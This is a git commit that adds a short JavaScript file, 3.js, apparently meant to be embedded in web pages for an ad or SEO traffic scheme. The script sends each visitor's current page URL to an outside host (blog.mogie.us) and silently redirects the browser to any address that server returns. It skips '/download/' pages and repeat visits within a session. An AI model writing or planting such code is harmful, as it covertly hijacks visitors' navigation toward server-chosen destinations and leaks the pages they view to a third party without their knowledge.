2e2dd4cd62848dbbdbaa6a935b5d36f850d08d38
seosmall <61647681+seosmall@users.noreply.github.com>
2022-09-24 14:06:10 +0700

    Create 3.js

---
+++ 3.js
@@ -0,0 +1,24 @@
+(function(){
+
+	var uads 		= sessionStorage.getItem('uads');
+	var go_current  = window.location.href;
+
+//	const endpoint 	= `https://106665513792548440341.uads.cc`;
+  var endpoint 	= ["https:\/\/blog.mogie.us"];
+
+	if(!uads && !go_current.includes("/download/"))
+	{
+		var rand = Math.floor(Math.random() * (99999999 - 9999999 + 1)) + 9999999;
+		var api_url=`${endpoint}/ping?x=${encodeURIComponent(go_current)}&nocache=${rand}`;
+
+		fetch(api_url).then(response=>response.json()).then(function(res){
+
+		if(res.status === true & res.direct !== false)
+		{
+			window.location.href = res.direct;
+		}
+		
+	}).catch(error=>console.log(error));
+	}
+	
+})();
